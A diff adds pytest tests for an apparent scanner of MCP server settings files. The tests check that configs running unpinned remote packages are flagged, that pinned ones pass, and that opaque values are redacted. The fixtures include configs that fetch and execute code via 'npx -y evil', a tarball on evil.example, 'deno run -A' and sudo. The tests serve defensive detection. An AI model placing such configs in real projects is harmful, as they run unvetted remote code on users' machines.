@@ -427,3 +427,52 @@ def test_wrapper_argument_lists_never_raise():
             for _ in range(30):
                 cut = words[:end] + rng.sample(words, rng.randint(0, len(words)))
                 resolve(cut[:rng.randint(0, len(cut))])
+
+
+@pytest.mark.parametrize("rel,data", [
+    ("crush.json", {"mcp": {"x": {"type": "stdio", "command": "npx", "args": ["-y", "evil"]}}}),
+    (".crush.json", {"mcp": {"x": {"type": "stdio", "command": "npx", "args": ["-y", "evil"]}}}),
+    (".amp/settings.json", {"amp.mcpServers": {"x": {"command": "npx", "args": ["-y", "evil"]}}}),
+    (".vscode/settings.json", {"amp.mcpServers": {"x": {"command": "npx", "args": ["-y", "evil"]}}}),
+])
+def test_round9_crush_and_amp_mcp_config(tmp_path, rel, data):
+    write(tmp_path, rel, json.dumps(data, indent=2))
+    assert [(f["rule"], f["detail"], f["line"]) for f in report(tmp_path)["findings"]] == [("AP04", "x: npx evil", 3)]
+
+
+@pytest.mark.parametrize("server", [
+    {"command": "npx", "args": ["-y", "https://github.com/someone/some-mcp"]},
+    {"command": "npx", "args": ["-y", "https://evil.example/pkg/-/pkg-latest.tgz"]},
+    {"command": "uvx", "args": ["--from", "https://github.com/someone/tool/archive/refs/heads/main.zip", "tool"]},
+    {"command": "bash", "args": ["-l", "-c", "npx -y some-mcp"]},
+    {"command": "bash", "args": ["--login", "-c", "npx -y some-mcp"]},
+    {"command": "sudo", "args": ["npx", "-y", "some-mcp"]},
+    {"command": "sudo", "args": ["-u", "app", "npx", "-y", "some-mcp"]},
+    {"command": "deno", "args": ["run", "-A", "npm:some-mcp-server"]},
+    {"command": "deno", "args": ["run", "-A", "jsr:@scope/some-mcp@^1.2.0"]},
+])
+def test_round9_remote_urls_and_hidden_runners_are_unpinned(tmp_path, server):
+    mcp(tmp_path, server)
+    assert rules(tmp_path) == ["AP04"]
+
+
+@pytest.mark.parametrize("server", [
+    {"command": "npx", "args": ["-y", "https://github.com/someone/some-mcp/archive/" + "a1" * 20 + ".tar.gz"]},
+    {"command": "npx", "args": ["-y", "https://evil.example/pkg.tgz#sha256=" + "ab" * 32]},
+    {"command": "deno", "args": ["run", "-A", "npm:some-mcp-server@1.2.3"]},
+    {"command": "deno", "args": ["run", "-A", "jsr:@scope/some-mcp@1.2.3"]},
+    {"command": "deno", "args": ["run", "-A", "server.ts"]},
+])
+def test_round9_pinned_urls_and_deno_specifiers(tmp_path, server):
+    mcp(tmp_path, server)
+    assert rules(tmp_path) == []
+
+
+def test_round9_an_opaque_value_is_never_shown_as_the_package(tmp_path):
+    value = "Zq9fPqLmZtRvWbNcHdJsKkXyTn"
+    mcp(tmp_path, {"command": "npx", "args": ["-k", value, "pkg@1.0.0"]})
+    mcp(tmp_path, {"command": "npx", "args": ["-k", value, "pkg"]}, rel="b/.mcp.json")
+    mcp(tmp_path, {"command": "npx", "args": ["--weird", value]}, rel="c/.mcp.json")
+    out = scan(tmp_path, "--fail-on", "none")[1] + json.dumps(report(tmp_path))
+    assert value not in out
+    assert sorted(found(tmp_path)) == [("AP04", "s0: npx <redacted>"), ("AP04", "s0: npx pkg")]
